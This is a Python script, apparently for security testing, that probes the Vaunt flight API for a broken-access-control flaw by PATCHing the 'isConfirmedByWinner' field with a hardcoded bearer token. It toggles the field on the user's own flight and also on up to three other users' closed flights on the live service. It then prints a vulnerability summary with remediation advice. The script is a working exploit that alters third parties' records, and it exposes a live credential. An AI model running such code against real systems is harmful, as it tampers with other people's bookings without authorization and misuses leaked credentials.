#!/usr/bin/env python3
"""
isConfirmedByWinner Field Modification Test
Tests if we can toggle the confirmation field on won flights
"""

import requests
import json
import time
from datetime import datetime

API_BASE = "https://vauntapi.flyvaunt.com"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Flight 8847 - Your won flight
FLIGHT_ID = 8847
SAMEER_ID = 20254

def get_flight_state(flight_id):
    """Get current flight state from flight history"""
    try:
        # Closed flights are in flight-history
        resp = requests.get(f"{API_BASE}/v1/flight-history", headers=HEADERS, timeout=10)

        if resp.status_code == 200:
            data = resp.json()
            flights = data.get('data', [])

            # Find the specific flight
            for flight in flights:
                if flight.get('id') == flight_id:
                    return {
                        'isConfirmedByWinner': flight.get('isConfirmedByWinner'),
                        'winner': flight.get('winner'),
                        'status': flight.get('status', {}).get('label'),
                        'passengers': flight.get('passengers', [])
                    }

            print(f"  Flight {flight_id} not found in history")
            return None
        else:
            print(f"  GET Status: {resp.status_code}")
            print(f"  Error response: {resp.text[:200]}")
            return None
    except Exception as e:
        print(f"  Exception: {str(e)}")
        return None

def patch_confirmation(flight_id, value):
    """Attempt to modify isConfirmedByWinner field"""
    payload = {"isConfirmedByWinner": value}

    resp = requests.patch(
        f"{API_BASE}/v1/flight/{flight_id}",
        headers=HEADERS,
        json=payload
    )

    return {
        'status': resp.status_code,
        'success': resp.status_code == 200,
        'response': resp.text[:200] if resp.text else "(empty)"
    }

def main():
    print("="*80)
    print("CONFIRMATION FIELD MODIFICATION TEST")
    print("="*80)
    print(f"Target: Flight {FLIGHT_ID} (Your won flight)")
    print(f"Time: {datetime.now().isoformat()}\n")

    # Step 1: Get initial state
    print("STEP 1: Get Initial State")
    print("-"*80)
    initial_state = get_flight_state(FLIGHT_ID)

    if not initial_state:
        print("❌ Failed to retrieve flight state")
        return

    print(f"Initial confirmation state: {initial_state['isConfirmedByWinner']}")
    print(f"Winner: {initial_state['winner']}")
    print(f"Status: {initial_state['status']}")
    print(f"Passengers: {len(initial_state['passengers'])} passenger(s)\n")

    initial_value = initial_state['isConfirmedByWinner']
    target_value = not initial_value  # Toggle to opposite

    # Step 2: Try to toggle to opposite value
    print(f"STEP 2: Toggle to {target_value}")
    print("-"*80)

    patch_result = patch_confirmation(FLIGHT_ID, target_value)
    print(f"PATCH Status: {patch_result['status']}")
    print(f"Response: {patch_result['response']}\n")

    time.sleep(0.5)

    # Step 3: Verify the change
    print("STEP 3: Verify Change")
    print("-"*80)

    after_toggle = get_flight_state(FLIGHT_ID)

    if not after_toggle:
        print("❌ Failed to retrieve flight state after toggle")
        return

    print(f"Before: {initial_value}")
    print(f"After:  {after_toggle['isConfirmedByWinner']}")

    if after_toggle['isConfirmedByWinner'] == target_value:
        print(f"✅ SUCCESS! Field changed from {initial_value} → {target_value}\n")
        changed = True
    else:
        print(f"❌ FAILED - Field did not change (still {after_toggle['isConfirmedByWinner']})\n")
        changed = False

    # Step 4: Try to toggle back to original
    if changed:
        print(f"STEP 4: Toggle Back to Original ({initial_value})")
        print("-"*80)

        patch_back = patch_confirmation(FLIGHT_ID, initial_value)
        print(f"PATCH Status: {patch_back['status']}")
        print(f"Response: {patch_back['response']}\n")

        time.sleep(0.5)

        final_state = get_flight_state(FLIGHT_ID)
        print(f"Current value: {final_state['isConfirmedByWinner']}")

        if final_state['isConfirmedByWinner'] == initial_value:
            print(f"✅ Successfully toggled back to {initial_value}\n")
            bidirectional = True
        else:
            print(f"❌ Failed to toggle back (stuck at {final_state['isConfirmedByWinner']})\n")
            bidirectional = False
    else:
        bidirectional = False

    # Step 5: Test on other flights
    print("STEP 5: Test on Other Flights")
    print("-"*80)

    # Get all flights to find other CLOSED flights
    resp = requests.get(f"{API_BASE}/v1/flight", headers=HEADERS)
    other_results = []

    if resp.status_code == 200:
        flights = resp.json()
        flights_list = flights if isinstance(flights, list) else flights.get('data', [])

        # Find CLOSED flights that aren't 8847
        closed_flights = [
            f for f in flights_list
            if f.get('status', {}).get('id') == 2 and f.get('id') != FLIGHT_ID
        ][:3]  # Test up to 3 other flights

        print(f"Found {len(closed_flights)} other CLOSED flights to test\n")

        for flight in closed_flights:
            flight_id = flight.get('id')
            winner = flight.get('winner')
            confirmed = flight.get('isConfirmedByWinner')

            print(f"Testing Flight {flight_id}:")
            print(f"  Winner: {winner}")
            print(f"  Current confirmation: {confirmed}")

            # Try to toggle
            toggle_result = patch_confirmation(flight_id, not confirmed)
            print(f"  PATCH Status: {toggle_result['status']}")

            time.sleep(0.3)

            # Check if it changed
            new_state = get_flight_state(flight_id)
            if new_state:
                if new_state['isConfirmedByWinner'] != confirmed:
                    print(f"  ✅ CHANGED! {confirmed} → {new_state['isConfirmedByWinner']}")
                    other_results.append((flight_id, True))

                    # Toggle back
                    patch_confirmation(flight_id, confirmed)
                else:
                    print(f"  ❌ No change (still {confirmed})")
                    other_results.append((flight_id, False))
            print()

    # Final Analysis
    print("="*80)
    print("VULNERABILITY ANALYSIS")
    print("="*80)

    print(f"\n1. CAN MODIFY ON YOUR WON FLIGHT (8847)?")
    if changed:
        print(f"   ✅ YES - Can toggle from {initial_value} → {target_value}")
    else:
        print(f"   ❌ NO - Field is read-only")

    print(f"\n2. CAN TOGGLE BIDIRECTIONALLY?")
    if bidirectional:
        print(f"   ✅ YES - Can toggle back and forth")
    else:
        print(f"   ❌ NO - Can only change once or not at all")

    print(f"\n3. WORKS ON OTHER FLIGHTS?")
    if other_results:
        successful = [fid for fid, success in other_results if success]
        if successful:
            print(f"   ✅ YES - Works on flights: {successful}")
        else:
            print(f"   ❌ NO - Only works on your own won flight")
    else:
        print(f"   ⚠️  Could not test other flights")

    print("\n" + "="*80)
    print("SECURITY IMPLICATIONS")
    print("="*80)

    if changed:
        print("""
🚨 CONFIRMED VULNERABILITY: isConfirmedByWinner Field Modification

WHAT CAN BE MODIFIED:
- isConfirmedByWinner field on won flights
- Can toggle between true/false states
- Changes persist in database

POTENTIAL IMPACTS:
1. Cancel/Unconfirm won flights
   - Set isConfirmedByWinner to false after confirming
   - May trigger re-allocation to next in queue
   - Could disrupt flight operations

2. Bypass confirmation requirements
   - Set to true without proper confirmation process
   - Skip mobile app confirmation flow
   - Automated exploitation possible

3. Data integrity issues
   - Field should be controlled by confirmation workflow
   - Manual PATCH access violates business logic
   - Audit trail may not capture PATCH modifications

SEVERITY: MEDIUM-HIGH
- Not as critical as changing winner
- But violates confirmation workflow integrity
- Could disrupt operations if exploited at scale

RECOMMENDATION:
- Block PATCH on isConfirmedByWinner field
- Make field read-only, only settable via confirmation endpoints
- Add audit logging for confirmation state changes
        """)
    else:
        print("""
✅ NOT VULNERABLE: isConfirmedByWinner Field is Protected

The field appears to be read-only via PATCH requests.
While the API returns 200 OK, the value doesn't actually change.
This is consistent with other protected fields like priority score.
        """)

if __name__ == "__main__":
    main()
